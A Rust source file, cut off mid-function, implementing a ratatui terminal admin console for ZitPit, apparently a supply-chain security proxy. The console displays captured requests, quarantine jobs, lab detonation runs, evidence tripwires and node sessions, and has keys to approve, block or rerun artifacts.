use std::time::Duration;

use anyhow::Result;
use chrono::{DateTime, Utc};
use crossterm::{
    event::{self, Event, KeyCode},
    execute,
    terminal::{EnterAlternateScreen, LeaveAlternateScreen, disable_raw_mode, enable_raw_mode},
};
use ratatui::{
    Frame, Terminal,
    backend::CrosstermBackend,
    layout::{Constraint, Direction, Layout, Rect},
    style::{Color, Modifier, Style},
    text::{Line, Span, Text},
    widgets::{Block, Borders, Paragraph, Row, Table, Tabs, Wrap},
};
use zitpit_admin_client::{AdminClient, DashboardSnapshot, OverviewModel, StorageSummaryModel};
use zitpit_core::{
    ApprovalStatus, ArtifactCoordinate, CapturedRequest, ClientVisibleOutcome, EvidenceBundle,
    HourlyFeedRecord, LabRun, LabRunStatus, ProxyAction, QuarantineStatus, Verdict,
};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Screen {
    Overview,
    Activity,
    Quarantine,
    LabRuns,
    Evidence,
    Feed,
    Nodes,
    Logs,
}

impl Screen {
    pub fn all() -> [Screen; 8] {
        [
            Screen::Overview,
            Screen::Activity,
            Screen::Quarantine,
            Screen::LabRuns,
            Screen::Evidence,
            Screen::Feed,
            Screen::Nodes,
            Screen::Logs,
        ]
    }

    pub fn title(self) -> &'static str {
        match self {
            Screen::Overview => "Overview",
            Screen::Activity => "Activity",
            Screen::Quarantine => "Quarantine",
            Screen::LabRuns => "Lab Runs",
            Screen::Evidence => "Evidence",
            Screen::Feed => "Feed",
            Screen::Nodes => "Nodes",
            Screen::Logs => "Status",
        }
    }
}

pub struct App {
    pub client: AdminClient,
    pub snapshot: DashboardSnapshot,
    pub selected_screen: usize,
    pub selected_row: usize,
    pub status: String,
}

impl App {
    pub fn new(client: AdminClient, snapshot: DashboardSnapshot) -> Self {
        Self {
            client,
            snapshot,
            selected_screen: 0,
            selected_row: 0,
            status: "Loaded ZitPit admin console".to_string(),
        }
    }

    pub async fn load(client: AdminClient) -> Self {
        let snapshot = client.snapshot().await.unwrap_or_else(|_| empty_snapshot());
        Self::new(client, snapshot)
    }

    pub fn next_screen(&mut self) {
        self.selected_screen = (self.selected_screen + 1) % Screen::all().len();
        self.selected_row = 0;
    }

    pub fn previous_screen(&mut self) {
        self.selected_screen =
            (self.selected_screen + Screen::all().len() - 1) % Screen::all().len();
        self.selected_row = 0;
    }

    pub fn move_down(&mut self) {
        self.selected_row = self.selected_row.saturating_add(1);
        self.clamp_selection();
    }

    pub fn move_up(&mut self) {
        self.selected_row = self.selected_row.saturating_sub(1);
    }

    pub fn selected_screen(&self) -> Screen {
        Screen::all()[self.selected_screen]
    }

    pub fn apply_snapshot(&mut self, snapshot: DashboardSnapshot, status: impl Into<String>) {
        self.snapshot = snapshot;
        self.status = status.into();
        self.clamp_selection();
    }

    pub fn selected_coordinate(&self) -> Option<ArtifactCoordinate> {
        self.snapshot
            .quarantine_jobs
            .get(self.selected_row)
            .map(|job| ArtifactCoordinate {
                ecosystem: job.artifact_key.ecosystem,
                source: job.artifact_key.source.clone(),
                requested_selector: job.artifact_key.requested_selector.clone(),
                selector_kind: job.artifact_key.selector_kind,
            })
    }

    fn clamp_selection(&mut self) {
        let max = match self.selected_screen() {
            Screen::Overview | Screen::Logs => 1,
            Screen::Activity => self.snapshot.activity.len().max(1),
            Screen::Quarantine => self.snapshot.quarantine_jobs.len().max(1),
            Screen::LabRuns => self.snapshot.lab_runs.len().max(1),
            Screen::Evidence => self.snapshot.evidence.len().max(1),
            Screen::Feed => self.snapshot.feed.len().max(1),
            Screen::Nodes => self.snapshot.nodes.len().max(1),
        };
        self.selected_row = self.selected_row.min(max.saturating_sub(1));
    }
}

pub async fn run_terminal_app() -> Result<()> {
    enable_raw_mode()?;
    let mut stdout = std::io::stdout();
    execute!(stdout, EnterAlternateScreen)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;
    let result = run_app(&mut terminal).await;
    disable_raw_mode()?;
    execute!(terminal.backend_mut(), LeaveAlternateScreen)?;
    terminal.show_cursor()?;
    result
}

pub async fn run_app(terminal: &mut Terminal<CrosstermBackend<std::io::Stdout>>) -> Result<()> {
    let client = AdminClient::from_local_defaults();
    let mut app = App::load(client).await;

    loop {
        terminal.draw(|frame| draw(frame, &app))?;
        if event::poll(Duration::from_millis(250))? {
            if let Event::Key(key) = event::read()? {
                match key.code {
                    KeyCode::Char('q') => return Ok(()),
                    KeyCode::Tab | KeyCode::Right => app.next_screen(),
                    KeyCode::BackTab | KeyCode::Left => app.previous_screen(),
                    KeyCode::Down => app.move_down(),
                    KeyCode::Up => app.move_up(),
                    KeyCode::Char('g') | KeyCode::Char('r') => refresh(&mut app).await,
                    KeyCode::Char('a') => approve_selected(&mut app).await,
                    KeyCode::Char('b') => block_selected(&mut app).await,
                    KeyCode::Char('e') => rerun_selected(&mut app).await,
                    _ => {}
                }
            }
        } else {
            refresh(&mut app).await;
        }
    }
}

pub async fn refresh(app: &mut App) {
    match app.client.snapshot().await {
        Ok(snapshot) => app.apply_snapshot(snapshot, "Refreshed live data"),
        Err(error) => app.status = format!("Refresh failed: {error}"),
    }
}

pub async fn approve_selected(app: &mut App) {
    if let Some(coordinate) = app.selected_coordinate() {
        match app
            .client
            .approve(coordinate, "approved-by-zitpit-tui".to_string())
            .await
        {
            Ok(()) => app.status = "Approved selected artifact".to_string(),
            Err(error) => app.status = format!("Approve failed: {error}"),
        }
        refresh(app).await;
    }
}

pub async fn block_selected(app: &mut App) {
    if let Some(coordinate) = app.selected_coordinate() {
        match app.client.block(coordinate, None).await {
            Ok(()) => app.status = "Blocked selected artifact".to_string(),
            Err(error) => app.status = format!("Block failed: {error}"),
        }
        refresh(app).await;
    }
}

pub async fn rerun_selected(app: &mut App) {
    if let Some(coordinate) = app.selected_coordinate() {
        match app.client.rerun_lab(coordinate).await {
            Ok(()) => app.status = "Queued rerun for selected artifact".to_string(),
            Err(error) => app.status = format!("Rerun failed: {error}"),
        }
        refresh(app).await;
    }
}

pub fn draw(frame: &mut Frame, app: &App) {
    let palette = Palette::default();
    let layout = Layout::default()
        .direction(Direction::Vertical)
        .constraints([
            Constraint::Length(3),
            Constraint::Length(3),
            Constraint::Min(10),
            Constraint::Length(2),
        ])
        .split(frame.area());

    let tabs = Tabs::new(
        Screen::all()
            .into_iter()
            .map(|screen| screen.title())
            .collect::<Vec<_>>(),
    )
    .select(app.selected_screen)
    .style(palette.muted())
    .highlight_style(palette.tab_highlight())
    .divider(Span::styled(" | ", palette.chrome()))
    .block(tui_block("ZitPit", &palette));
    frame.render_widget(tabs, layout[0]);

    let overview = Paragraph::new(overview_bar_text(app, &palette))
        .block(tui_block("Overview Bar", &palette))
        .wrap(Wrap { trim: true });
    frame.render_widget(overview, layout[1]);

    match app.selected_screen() {
        Screen::Overview => draw_overview(frame, layout[2], app, &palette),
        Screen::Activity => draw_activity(frame, layout[2], app, &palette),
        Screen::Quarantine => draw_quarantine(frame, layout[2], app, &palette),
        Screen::LabRuns => draw_lab_runs(frame, layout[2], app, &palette),
        Screen::Evidence => draw_evidence(frame, layout[2], app, &palette),
        Screen::Feed => draw_feed(frame, layout[2], app, &palette),
        Screen::Nodes => draw_nodes(frame, layout[2], app, &palette),
        Screen::Logs => draw_logs(frame, layout[2], app, &palette),
    }

    let help = Paragraph::new(Line::from(vec![
        Span::styled("tab", palette.chrome()),
        Span::raw(" switch  "),
        Span::styled("up/down", palette.chrome()),
        Span::raw(" move  "),
        Span::styled("g", palette.accent()),
        Span::raw(" refresh  "),
        Span::styled("a", palette.success()),
        Span::raw(" approve  "),
        Span::styled("b", palette.error()),
        Span::raw(" block  "),
        Span::styled("e", palette.warning()),
        Span::raw(" rerun  "),
        Span::styled("q", palette.hash()),
        Span::raw(" quit"),
    ]))
    .block(tui_block_with_title_style(
        app.status.as_str(),
        &palette,
        status_style(&app.status, &palette),
    ));
    frame.render_widget(help, layout[3]);
}

fn draw_overview(frame: &mut Frame, area: Rect, app: &App, palette: &Palette) {
    let rows = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Length(9), Constraint::Min(12)])
        .split(area);
    let cards = Layout::default()
        .direction(Direction::Horizontal)
        .constraints([
            Constraint::Percentage(25),
            Constraint::Percentage(25),
            Constraint::Percentage(25),
            Constraint::Percentage(25),
        ])
        .split(rows[0]);
    let content = Layout::default()
        .direction(Direction::Horizontal)
        .constraints([Constraint::Percentage(58), Constraint::Percentage(42)])
        .split(rows[1]);

    render_metric_card(
        frame,
        cards[0],
        "Live Requests",
        app.snapshot.overview.captured_requests.to_string(),
        "proxy decisions observed",
        palette.accent(),
        palette,
    );
    render_metric_card(
        frame,
        cards[1],
        "Quarantine",
        app.snapshot.overview.quarantine_jobs.to_string(),
        "repos under review",
        palette.warning(),
        palette,
    );
    render_metric_card(
        frame,
        cards[2],
        "Lab Runs",
        app.snapshot.overview.lab_runs.to_string(),
        "detonation jobs tracked",
        palette.hash(),
        palette,
    );
    render_metric_card(
        frame,
        cards[3],
        "Feed Alerts",
        app.snapshot.overview.feed_records.to_string(),
        "operator actions queued",
        palette.success(),
        palette,
    );

    let hero = Paragraph::new(overview_hero_text(app, palette))
        .wrap(Wrap { trim: true })
        .block(tui_block("Protected Session", palette));
    frame.render_widget(hero, content[0]);

    let storage = Paragraph::new(storage_summary_text(&app.snapshot.storage_summary, palette))
        .wrap(Wrap { trim: true })
        .block(tui_block("Storage Radar", palette));
    frame.render_widget(storage, content[1]);
}

fn draw_activity(frame: &mut Frame, area: Rect, app: &App, palette: &Palette) {
    let [list, detail, metrics] = split_activity_area(area);
    let rows = app
        .snapshot
        .activity
        .iter()
        .take(20)
        .enumerate()
        .map(|(idx, item)| {
            let style = selected_style(idx, app.selected_row, palette);
            Row::new(vec![
                item.observation.method.clone(),
                item.observation.authority.clone(),
                item.classification.reason.clone(),
                format!("{:?}", item.proxy_action),
            ])
            .style(style)
        });
    let table = Table::new(
        rows,
        [
            Constraint::Length(8),
            Constraint::Length(28),
            Constraint::Min(20),
            Constraint::Length(12),
        ],
    )
    .header(Row::new(vec!["Method", "Authority", "Reason", "Action"]).style(palette.header()))
    .block(tui_block("Captured Requests", palette));
    frame.render_widget(table, list);
    render_detail(
        frame,
        detail,
        "Request Detail",
        selected_activity_detail(app, palette),
        palette,
    );
    frame.render_widget(
        Paragraph::new(activity_metrics_text(app, palette))
            .wrap(Wrap { trim: true })
            .block(tui_block("Ops Pulse", palette)),
        metrics,
    );
}

fn draw_quarantine(frame: &mut Frame, area: Rect, app: &App, palette: &Palette) {
    let [list, detail] = split_main_area(area);
    let rows = app
        .snapshot
        .quarantine_jobs
        .iter()
        .enumerate()
        .map(|(idx, item)| {
            let style = selected_style(idx, app.selected_row, palette);
            Row::new(vec![
                item.artifact_key.source.clone(),
                item.artifact_key.requested_selector.clone(),
                format!("{:?}", item.status),
            ])
            .style(style)
        });
    let table = Table::new(
        rows,
        [
            Constraint::Percentage(60),
            Constraint::Percentage(20),
            Constraint::Percentage(20),
        ],
    )
    .header(Row::new(vec!["Source", "Selector", "Status"]).style(palette.header()))
    .block(tui_block("Quarantine Jobs", palette));
    frame.render_widget(table, list);
    render_detail(
        frame,
        detail,
        "Correlated Detail",
        selected_quarantine_detail(app, palette),
        palette,
    );
}

fn draw_lab_runs(frame: &mut Frame, area: Rect, app: &App, palette: &Palette) {
    let rows = app.snapshot.lab_runs.iter().take(20).map(|run| {
        Row::new(vec![
            run.run_id.to_string(),
            format!("{:?}", run.status),
            run.notes.join("; "),
        ])
        .style(style_for_lab_run(run.status, palette))
    });
    let table = Table::new(
        rows,
        [
            Constraint::Length(36),
            Constraint::Length(12),
            Constraint::Min(20),
        ],
    )
    .header(Row::new(vec!["Run", "Status", "Notes"]).style(palette.header()))
    .block(tui_block("Lab Runs", palette));
    frame.render_widget(table, area);
}

fn draw_evidence(frame: &mut Frame, area: Rect, app: &App, palette: &Palette) {
    let [list, detail] = split_main_area(area);
    let rows = app
        .snapshot
        .evidence
        .iter()
        .take(20)
        .enumerate()
        .map(|(idx, bundle)| {
            Row::new(vec![
                bundle.summary.artifact.source.clone(),
                format!("{:?}", bundle.summary.verdict),
                bundle.summary.tripwires.len().to_string(),
            ])
            .style(selected_style(idx, app.selected_row, palette))
        });
    let table = Table::new(
        rows,
        [
            Constraint::Percentage(60),
            Constraint::Percentage(20),
            Constraint::Percentage(20),
        ],
    )
    .header(Row::new(vec!["Artifact", "Verdict", "Tripwires"]).style(palette.header()))
    .block(tui_block("Evidence", palette));
    frame.render_widget(table, list);
    render_detail(
        frame,
        detail,
        "Evidence Detail",
        selected_evidence_detail(app, palette),
        palette,
    );
}

fn draw_feed(frame: &mut Frame, area: Rect, app: &App, palette: &Palette) {
    let [list, detail] = split_main_area(area);
    let rows = app
        .snapshot
        .feed
        .iter()
        .take(20)
        .enumerate()
        .map(|(idx, record)| {
            Row::new(vec![
                record.artifact.source.clone(),
                format!("{:?}", record.status),
                record.recommended_action.clone(),
            ])
            .style(selected_style(idx, app.selected_row, palette))
        });
    let table = Table::new(
        rows,
        [
            Constraint::Percentage(50),
            Constraint::Percentage(15),
            Constraint::Percentage(35),
        ],
    )
    .header(Row::new(vec!["Artifact", "Status", "Action"]).style(palette.header()))
    .block(tui_block("Feed", palette));
    frame.render_widget(table, list);
    render_detail(
        frame,
        detail,
        "Feed Detail",
        selected_feed_detail(app, palette),
        palette,
    );
}

fn draw_nodes(frame: &mut Frame, area: Rect, app: &App, palette: &Palette) {
    let rows = app.snapshot.nodes.iter().map(|node| {
        Row::new(vec![
            node.node_id.clone(),
            node.hostname.clone(),
            node.user_label.clone(),
            node.policy_version.clone(),
        ])
        .style(palette.neutral())
    });
    let table = Table::new(
        rows,
        [
            Constraint::Length(18),
            Constraint::Length(24),
            Constraint::Length(18),
            Constraint::Length(10),
        ],
    )
    .header(Row::new(vec!["Node", "Hostname", "User", "Policy"]).style(palette.header()))
    .block(tui_block("Node Sessions", palette));
    frame.render_widget(table, area);
}

fn draw_logs(frame: &mut Frame, area: Rect, app: &App, palette: &Palette) {
    let lines = Text::from(vec![
        metric_line("Selected screen", app.selected_screen().title(), palette),
        metric_line("Selected row", &app.selected_row.to_string(), palette),
        metric_line("Status", &app.status, palette),
        metric_line(
            "Snapshot time",
            &format_timestamp(app.snapshot.storage_summary.snapshot_generated_at),
            palette,
        ),
    ]);
    frame.render_widget(
        Paragraph::new(lines)
            .wrap(Wrap { trim: true })
            .block(tui_block("Live Status", palette)),
        area,
    );
}

fn split_main_area(area: Rect) -> [Rect; 2] {
    let parts = Layout::default()
        .direction(Direction::Horizontal)
        .constraints([Constraint::Percentage(58), Constraint::Percentage(42)])
        .split(area);
    [parts[0], parts[1]]
}

fn split_activity_area(area: Rect) -> [Rect; 3] {
    if area.width < 115 {
        let rows = Layout::default()
            .direction(Direction::Vertical)
            .constraints([Constraint::Percentage(54), Constraint::Percentage(46)])
            .split(area);
        let bottom = Layout::default()
            .direction(Direction::Horizontal)
            .constraints([Constraint::Percentage(64), Constraint::Percentage(36)])
            .split(rows[1]);
        [rows[0], bottom[0], bottom[1]]
    } else {
        let parts = Layout::default()
            .direction(Direction::Horizontal)
            .constraints([
                Constraint::Percentage(46),
                Constraint::Percentage(36),
                Constraint::Percentage(18),
            ])
            .split(area);
        [parts[0], parts[1], parts[2]]
    }
}

fn render_detail(frame: &mut Frame, area: Rect, title: &str, body: Text<'_>, palette: &Palette) {
    frame.render_widget(
        Paragraph::new(body)
            .wrap(Wrap { trim: true })
            .block(tui_block(title, palette)),
        area,
    );
}

fn selected_style(idx: usize, selected_row: usize, palette: &Palette) -> Style {
    if idx == selected_row {
        Style::default()
            .fg(Color::Black)
            .bg(Color::Cyan)
            .add_modifier(Modifier::BOLD)
    } else {
        palette.neutral()
    }
}

fn selected_activity_detail(app: &App, palette: &Palette) -> Text<'static> {
    app.snapshot
        .activity
        .get(app.selected_row)
        .map(|request| {
            let mut lines = vec![
                metric_line("request_id", &request.request_id.to_string(), palette),
                metric_line("source", artifact_source(request), palette),
                Line::from(vec![
                    Span::styled("decision", palette.label()),
                    Span::raw(": "),
                    Span::styled(
                        format!("{:?}", request.proxy_action),
                        style_for_proxy_action(request.proxy_action, palette),
                    ),
                    Span::raw(" :: "),
                    Span::styled(request.decision_reason.clone(), palette.neutral()),
                ]),
                Line::from(vec![
                    Span::styled("client_outcome", palette.label()),
                    Span::raw(": "),
                    Span::styled(
                        request
                            .client_outcome
                            .map(|value| format!("{value:?}"))
                            .unwrap_or_else(|| "<unknown>".to_string()),
                        style_for_client_outcome(request.client_outcome, palette),
                    ),
                ]),
                Line::from(vec![
                    Span::styled("trace", palette.header()),
                    Span::raw(":"),
                ]),
            ];
            for event in request.trace.events.iter().take(8) {
                lines.push(styled_trace_line(
                    &format!("{:?}", event.kind),
                    &event.detail,
                    palette,
                ));
            }
            Text::from(lines)
        })
        .unwrap_or_else(|| {
            Text::from(vec![Line::from(Span::styled(
                "No request selected",
                palette.muted(),
            ))])
        })
}

fn selected_quarantine_detail(app: &App, palette: &Palette) -> Text<'static> {
    app.snapshot
        .quarantine_jobs
        .get(app.selected_row)
        .map(|job| {
            let source = job.artifact_key.source.as_str();
            let request = related_request(source, &app.snapshot.activity);
            let run = related_run(source, &app.snapshot.lab_runs);
            let evidence = related_evidence(source, &app.snapshot.evidence);
            let feed = related_feed(source, &app.snapshot.feed);
            let mut lines = vec![
                metric_line("source", &job.artifact_key.source, palette),
                metric_line("selector", &job.artifact_key.requested_selector, palette),
                Line::from(vec![
                    Span::styled("quarantine_status", palette.label()),
                    Span::raw(": "),
                    Span::styled(
                        format!("{:?}", job.status),
                        style_for_quarantine(job.status, palette),
                    ),
                ]),
                metric_line(
                    "request",
                    &request
                        .map(|item| item.request_id.to_string())
                        .unwrap_or_else(|| "<missing>".to_string()),
                    palette,
                ),
                metric_line(
                    "lab_run",
                    &run.map(|item| item.run_id.to_string())
                        .unwrap_or_else(|| "<missing>".to_string()),
                    palette,
                ),
                Line::from(vec![
                    Span::styled("evidence", palette.label()),
                    Span::raw(": "),
                    Span::styled(
                        evidence
                            .map(|item| format!("{:?}", item.summary.verdict))
                            .unwrap_or_else(|| "<missing>".to_string()),
                        evidence
                            .map(|item| style_for_verdict(item.summary.verdict, palette))
                            .unwrap_or_else(|| palette.muted()),
                    ),
                ]),
                Line::from(vec![
                    Span::styled("feed", palette.label()),
                    Span::raw(": "),
                    Span::styled(
                        feed.map(|item| format!("{:?}", item.status))
                            .unwrap_or_else(|| "<missing>".to_string()),
                        feed.map(|item| style_for_approval(item.status, palette))
                            .unwrap_or_else(|| palette.muted()),
                    ),
                ]),
                metric_line(
                    "retry_hint",
                    &request
                        .map(|item| item.decision_reason.clone())
                        .unwrap_or_else(|| "wait for verification".to_string()),
                    palette,
                ),
            ];

            if let Some(entry) = &job.cache_entry {
                lines.push(metric_line(
                    "cache_size",
                    &entry
                        .size_bytes
                        .map(format_bytes)
                        .unwrap_or_else(|| "unknown".to_string()),
                    palette,
                ));
                lines.push(metric_line(
                    "downloaded_at",
                    &format_timestamp(entry.created_at),
                    palette,
                ));
            }

            Text::from(lines)
        })
        .unwrap_or_else(|| {
            Text::from(vec![Line::from(Span::styled(
                "No quarantine job selected",
                palette.muted(),
            ))])
        })
}

fn selected_evidence_detail(app: &App, palette: &Palette) -> Text<'static> {
    app.snapshot
        .evidence
        .get(app.selected_row)
        .map(|bundle| {
            let mut lines = vec![
                metric_line("source", &bundle.summary.artifact.source, palette),
                Line::from(vec![
                    Span::styled("verdict", palette.label()),
                    Span::raw(": "),
                    Span::styled(
                        format!("{:?}", bundle.summary.verdict),
                        style_for_verdict(bundle.summary.verdict, palette),
                    ),
                ]),
                Line::from(vec![
                    Span::styled("tripwires", palette.header()),
                    Span::raw(":"),
                ]),
            ];
            for tripwire in &bundle.summary.tripwires {
                lines.push(Line::from(vec![
                    Span::styled("  - ", palette.chrome()),
                    Span::styled(format!("{tripwire:?}"), palette.warning()),
                ]));
            }
            lines.extend(
                bundle
                    .sinkhole_transcript
                    .iter()
                    .map(|line| metric_line("sinkhole", line, palette)),
            );
            Text::from(lines)
        })
        .unwrap_or_else(|| {
            Text::from(vec![Line::from(Span::styled(
                "No evidence selected",
                palette.muted(),
            ))])
        })
}

fn selected_feed_detail(app: &App, palette: &Palette) -> Text<'static> {
    app.snapshot
        .feed
        .get(app.selected_row)
        .map(|record| {
            Text::from(vec![
                metric_line("source", &record.artifact.source, palette),
                Line::from(vec![
                    Span::styled("status", palette.label()),
                    Span::raw(": "),
                    Span::styled(
                        format!("{:?}", record.status),
                        style_for_approval(record.status, palette),
                    ),
                ]),
                metric_line("action", &record.recommended_action, palette),
                metric_line(
                    "trigger",
                    &record
                        .trigger_category
                        .map(|value| format!("{value:?}"))
                        .unwrap_or_else(|| "<none>".to_string()),
                    palette,
                ),
            ])
        })
        .unwrap_or_else(|| {
            Text::from(vec![Line::from(Span::styled(
                "No feed record selected",
                palette.muted(),
            ))])
        })
}

fn related_request<'a>(
    source: &str,
    activity: &'a [CapturedRequest],
) -> Option<&'a CapturedRequest> {
    activity
        .iter()
        .find(|request| artifact_source(request) == source)
}

fn related_run<'a>(source: &str, runs: &'a [LabRun]) -> Option<&'a LabRun> {
    runs.iter().find(|run| run.artifact_key.source == source)
}

fn related_evidence<'a>(
    source: &str,
    evidence: &'a [EvidenceBundle],
) -> Option<&'a EvidenceBundle> {
    evidence
        .iter()
        .find(|bundle| bundle.artifact_key.source == source)
}

fn related_feed<'a>(source: &str, feed: &'a [HourlyFeedRecord]) -> Option<&'a HourlyFeedRecord> {
    feed.iter().find(|record| record.artifact.source == source)
}

fn artifact_source(request: &CapturedRequest) -> &str {
    request
        .artifact_key
        .as_ref()
        .map(|key| key.source.as_str())
        .unwrap_or_else(|| request.observation.authority.as_str())
}

#[derive(Debug, Clone, Copy)]
struct Palette {
    chrome: Color,
    accent: Color,
    success: Color,
    warning: Color,
    error: Color,
    hash: Color,
    neutral: Color,
    muted: Color,
}

impl Default for Palette {
    fn default() -> Self {
        Self {
            chrome: Color::Cyan,
            accent: Color::LightBlue,
            success: Color::LightGreen,
            warning: Color::Yellow,
            error: Color::LightRed,
            hash: Color::Magenta,
            neutral: Color::White,
            muted: Color::Gray,
        }
    }
}

impl Palette {
    fn chrome(self) -> Style {
        Style::default()
            .fg(self.chrome)
            .add_modifier(Modifier::BOLD)
    }

    fn accent(self) -> Style {
        Style::default()
            .fg(self.accent)
            .add_modifier(Modifier::BOLD)
    }

    fn success(self) -> Style {
        Style::default()
            .fg(self.success)
            .add_modifier(Modifier::BOLD)
    }

    fn warning(self) -> Style {
        Style::default()
            .fg(self.warning)
            .add_modifier(Modifier::BOLD)
    }

    fn error(self) -> Style {
        Style::default().fg(self.error).add_modifier(Modifier::BOLD)
    }

    fn hash(self) -> Style {
        Style::default().fg(self.hash).add_modifier(Modifier::BOLD)
    }

    fn neutral(self) -> Style {
        Style::default().fg(self.neutral)
    }

    fn muted(self) -> Style {
        Style::default().fg(self.muted)
    }

    fn label(self) -> Style {
        self.chrome()
    }

    fn header(self) -> Style {
        self.accent()
    }

    fn tab_highlight(self) -> Style {
        Style::default()
            .fg(self.warning)
            .bg(Color::DarkGray)
            .add_modifier(Modifier::BOLD)
    }
}

fn tui_block(title: &str, palette: &Palette) -> Block<'static> {
    tui_block_with_title_style(title, palette, palette.chrome())
}

fn tui_block_with_title_style(
    title: &str,
    palette: &Palette,
    title_style: Style,
) -> Block<'static> {
    Block::default()
        .borders(Borders::ALL)
        .border_style(palette.chrome())
        .title(Span::styled(title.to_string(), title_style))
}

fn overview_bar_text(app: &App, palette: &Palette) -> Text<'static> {
    Text::from(Line::from(vec![
        badge(
            "REQ",
            app.snapshot.overview.captured_requests,
            palette.accent(),
        ),
        Span::raw(" "),
        badge(
            "MAN",
            app.snapshot.overview.manifest_records,
            palette.success(),
        ),
        Span::raw(" "),
        badge(
            "Q",
            app.snapshot.overview.quarantine_jobs,
            palette.warning(),
        ),
        Span::raw(" "),
        badge("LAB", app.snapshot.overview.lab_runs, palette.hash()),
        Span::raw(" "),
        badge(
            "EVD",
            app.snapshot.overview.evidence_bundles,
            palette.error(),
        ),
        Span::raw(" "),
        badge("FEED", app.snapshot.overview.feed_records, palette.chrome()),
        Span::raw(" "),
        badge(
            "NODE",
            app.snapshot.overview.node_sessions,
            palette.neutral(),
        ),
    ]))
}

fn badge(label: &str, value: usize, style: Style) -> Span<'static> {
    Span::styled(format!("{label}:{value}"), style)
}

fn render_metric_card(
    frame: &mut Frame,
    area: Rect,
    title: &str,
    value: String,
    subtitle: &str,
    emphasis: Style,
    palette: &Palette,
) {
    let body = Text::from(vec![
        Line::from(Span::styled(value, emphasis)),
        Line::from(Span::styled(subtitle.to_string(), palette.muted())),
    ]);
    frame.render_widget(
        Paragraph::new(body)
            .wrap(Wrap { trim: true })
            .block(tui_block(title, palette)),
        area,
    );
}

fn overview_hero_text(app: &App, palette: &Palette) -> Text<'static> {
    let pending = app
        .snapshot
        .activity
        .iter()
        .filter(|request| matches!(request.proxy_action, ProxyAction::Pending))
        .count();
    let blocked = app
        .snapshot
        .feed
        .iter()
        .filter(|record| matches!(record.status, ApprovalStatus::Blocked))
        .count();
    let latest_node = app
        .snapshot
        .nodes
        .iter()
        .max_by_key(|node| node.last_seen_at)
        .map(|node| format!("{} @ {}", node.user_label, node.hostname))
        .unwrap_or_else(|| "no active node sessions".to_string());

    Text::from(vec![
        Line::from(vec![
            Span::styled("Protected dev session status", palette.success()),
            Span::raw("  "),
            Span::styled("LIVE", palette.hash()),
        ]),
        Line::from(""),
        metric_line("Pending decisions", &pending.to_string(), palette),
        metric_line("Blocked findings", &blocked.to_string(), palette),
        metric_line("Active node", &latest_node, palette),
        metric_line(
            "Last snapshot",
            &format_timestamp(app.snapshot.storage_summary.snapshot_generated_at),
            palette,
        ),
        Line::from(""),
        Line::from(Span::styled(
            "Use the tabs to inspect live requests, quarantine state, evidence, and feed pressure.",
            palette.neutral(),
        )),
    ])
}

fn storage_summary_text(summary: &StorageSummaryModel, palette: &Palette) -> Text<'static> {
    Text::from(vec![
        Line::from(vec![
            Span::styled("Repos downloaded", palette.label()),
            Span::raw(": "),
            Span::styled(
                summary.total_repos_downloaded.to_string(),
                palette.success(),
            ),
        ]),
        Line::from(vec![
            Span::styled("Total storage", palette.label()),
            Span::raw(": "),
            Span::styled(format_bytes(summary.total_storage_bytes), palette.hash()),
        ]),
        Line::from(vec![
            Span::styled("Latest download", palette.label()),
            Span::raw(": "),
            Span::styled(
                summary
                    .latest_download_at
                    .map(format_timestamp)
                    .unwrap_or_else(|| "none yet".to_string()),
                palette.neutral(),
            ),
        ]),
        Line::from(vec![
            Span::styled("Latest file size", palette.label()),
            Span::raw(": "),
            Span::styled(
                summary
                    .latest_download_size_bytes
                    .map(format_bytes)
                    .unwrap_or_else(|| "unknown".to_string()),
                palette.warning(),
            ),
        ]),
        Line::from(vec![
            Span::styled("Snapshot time", palette.label()),
            Span::raw(": "),
            Span::styled(
                format_timestamp(summary.snapshot_generated_at),
                palette.muted(),
            ),
        ]),
    ])
}

fn activity_metrics_text(app: &App, palette: &Palette) -> Text<'static> {
    let errors = app
        .snapshot
        .activity
        .iter()
        .filter(|request| {
            matches!(
                request.client_outcome,
                Some(ClientVisibleOutcome::Blocked | ClientVisibleOutcome::UpstreamError)
            )
        })
        .count();
    let successes = app
        .snapshot
        .feed
        .iter()
        .filter(|item| matches!(item.status, ApprovalStatus::Approved))
        .count();
    let pending = app
        .snapshot
        .quarantine_jobs
        .iter()
        .filter(|job| {
            matches!(
                job.status,
                QuarantineStatus::Pending | QuarantineStatus::Analyzing
            )
        })
        .count();

    Text::from(vec![
        Line::from(vec![
            Span::styled("Success", palette.label()),
            Span::raw(": "),
            Span::styled(successes.to_string(), palette.success()),
        ]),
        Line::from(vec![
            Span::styled("Errors", palette.label()),
            Span::raw(": "),
            Span::styled(errors.to_string(), palette.error()),
        ]),
        Line::from(vec![
            Span::styled("Pending", palette.label()),
            Span::raw(": "),
            Span::styled(pending.to_string(), palette.warning()),
        ]),
        Line::from(""),
        Line::from(vec![
            Span::styled("Repos", palette.label()),
            Span::raw(": "),
            Span::styled(
                app.snapshot
                    .storage_summary
                    .total_repos_downloaded
                    .to_string(),
                palette.success(),
            ),
        ]),
        Line::from(vec![
            Span::styled("Storage", palette.label()),
            Span::raw(": "),
            Span::styled(
                format_bytes(app.snapshot.storage_summary.total_storage_bytes),
                palette.hash(),
            ),
        ]),
        Line::from(vec![
            Span::styled("Latest size", palette.label()),
            Span::raw(": "),
            Span::styled(
                app.snapshot
                    .storage_summary
                    .latest_download_size_bytes
                    .map(format_bytes)
                    .unwrap_or_else(|| "unknown".to_string()),
                palette.warning(),
            ),
        ]),
    ])
}

fn metric_line(label: &str, value: &str, palette: &Palette) -> Line<'static> {
    Line::from(vec![
        Span::styled(label.to_string(), palette.label()),
        Span::raw(": "),
        Span::styled(value.to_string(), palette.neutral()),
    ])
}

fn styled_trace_line(kind: &str, detail: &str, palette: &Palette) -> Line<'static> {
    let mut spans = vec![
        Span::styled("  - ", palette.chrome()),
        Span::styled(kind.to_string(), palette.warning()),
        Span::raw(": "),
    ];
    spans.extend(highlight_hashes(detail, palette));
    Line::from(spans)
}

fn highlight_hashes(text: &str, palette: &Palette) -> Vec<Span<'static>> {
    let mut spans = Vec::new();
    let mut start = 0usize;
    let bytes = text.as_bytes();
    let len = bytes.len();

    while start < len {
        let mut end = start;
        while end < len && !bytes[end].is_ascii_hexdigit() {
            end += 1;
        }
        if end > start {
            spans.push(Span::styled(
                text[start..end].to_string(),
                palette.neutral(),
            ));
        }

        let mut hash_end = end;
